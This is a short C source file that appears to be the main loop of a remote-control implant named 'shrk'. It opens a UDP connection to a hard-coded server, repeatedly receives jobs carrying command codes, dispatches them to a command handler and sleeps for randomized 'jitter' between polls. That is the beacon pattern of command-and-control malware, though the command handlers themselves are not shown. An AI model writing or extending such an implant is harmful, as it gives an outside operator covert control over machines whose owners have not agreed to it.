#include "inc/client.h"
#include "inc/cmd.h"
#include "inc/job.h"
#include "inc/util.h"

#include <stdbool.h>
#include <strings.h>

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>

int main() {
  client_t _client, *client = &_client;
  job_t    _job, *job       = &_job;

  // initializtion
  randseed();
  job_new(job, client);

  // setup the UDP client connection (also does address resolving)
  if (client_setup(client, SHRK_SERVER_ADDR, SHRK_SERVER_PORT) < 0) {
    debug("failed to create a connection: %s\n", strerror(errno));
    return EXIT_FAILURE;
  }

  // ask for jobs and handle them
  while (true) {
    if (!job_recv(job, true))
      goto next;

    debug("got a new job (id: %s, command: 0x%02x)", job->id, job->cmd);
    cmd_handle(job);

  next:
    jitter();
  }

  // we are done, free/cleanup stuff
  job_free(job);
  return EXIT_SUCCESS;
}
